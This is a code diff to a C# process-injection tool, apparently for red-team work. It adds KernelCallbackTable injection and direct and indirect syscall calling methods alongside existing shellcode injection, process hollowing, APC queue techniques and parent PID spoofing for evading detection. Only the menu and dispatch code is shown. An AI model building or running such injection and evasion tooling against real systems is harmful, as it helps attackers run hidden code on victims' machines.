@@ -41,15 +41,18 @@ namespace ProcessInjection
             string help = @"
 *****************Help*****************
 [+] The program is designed to perform process injection.
-[+] Currently the tool supports 4 process injection techniques.
+[+] Currently the tool supports 5 process injection techniques.
     1) CreateRemoteThread Injection
     2) DLL Injection
     3) Process Hollowing
     4) APC Queue Injection
+    5) KernelCallbackTable Injection
 
-[+] The tool 2 methods of calling the Win32APIs.
+[+] The tool supports 4 methods of calling the Win32APIs.
     1) P/Invoke
     2) D/Invoke
+    3) Direct Syscalls
+    4) Indirect Syscalls
 
 [+] Supports 3 detection evading techniques.
     1) Parent PID Spoofing
@@ -72,9 +75,12 @@ Usage           Description
                 2 = DLL Injection
                 3 = Process Hollowing
                 4 = APC Queue Injection
+                5 = KernelCallbackTable Injection
 /m              Specify the method to be used
                 p = P/Invoke (Default)
                 d = D/Invoke
+                ds = Direct Syscalls
+                ids = Indirect Syscalls
 /f              Specify the format of the shellcode.
                 base64
                 hex
@@ -277,7 +283,7 @@ Usage           Description
                                     if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
                                     {
                                         PrintTitle($"[>>] Dynamic Invoke - Parent Process Spoofing with Vanilla Process Injection Technique.");
-                                        DInvoke.CreateRemoteThread.PPIDDynCodeInject(arguments["/ppath"], buf, parentProc);
+                                        DInvoke.DInvokeCreateRemoteThread.PPIDDynCodeInject(arguments["/ppath"], buf, parentProc);
                                     }
                                     else
                                     {
@@ -295,7 +301,17 @@ Usage           Description
                                 if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
                                 {
                                     PrintTitle($"[>>] Dynamic Invoke - Vanilla Process Injection Technique.");
-                                    DInvoke.CreateRemoteThread.DynamicCodeInject(procid, buf);
+                                    DInvoke.DInvokeCreateRemoteThread.DynamicCodeInject(procid, buf);
+                                }
+                                else if (arguments.ContainsKey("/m") && arguments["/m"] == "ds")
+                                {
+                                    PrintTitle($"[>>] Direct Syscalls - Vanilla Process Injection Technique.");
+                                    DirectSyscalls.CreateRemoteThread.DirectSyscallCreateRemoteThread(procid, buf);
+                                }
+                                else if (arguments.ContainsKey("/m") && arguments["/m"] == "ids")
+                                {
+                                    PrintTitle($"[>>] Indirect Syscalls - Vanilla Process Injection Technique.");
+                                    IndirectSyscalls.CreateRemoteThread.InDirectSyscallCreateRemoteThread(procid, buf);
                                 }
                                 else
                                 {
@@ -367,7 +383,7 @@ Usage           Description
                                     if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
                                     {
                                         PrintTitle($"[>>] Dynamic Invoke - APC Queue Injection Technique.");
-                                        DInvoke.Native.Structs.PROCESS_INFORMATION processInfo = DInvoke.APCQueue.StartProcess(arguments["/ppath"]);
+                                        PROCESS_INFORMATION processInfo = DInvoke.APCQueue.StartProcess(arguments["/ppath"]);
                                         DInvoke.APCQueue.DynamicAPCInject(processInfo.dwProcessId, processInfo.dwThreadId, buf);
                                     }
                                     else
@@ -382,6 +398,11 @@ Usage           Description
                             {
                                 PrintError("[-] /ppath argument is missing");
                             }
+                        }
+                        else if (arguments["/t"] == "5")
+                        {
+                            PrintTitle($"[>>] KernelCallbackTable Injection Technique.");
+                            PInvoke.KernelCallBackTable.KernelCallbackTableInjection(buf, arguments["/ppath"]);
                         }
                     }
                     else if (arguments["/t"] == "2")
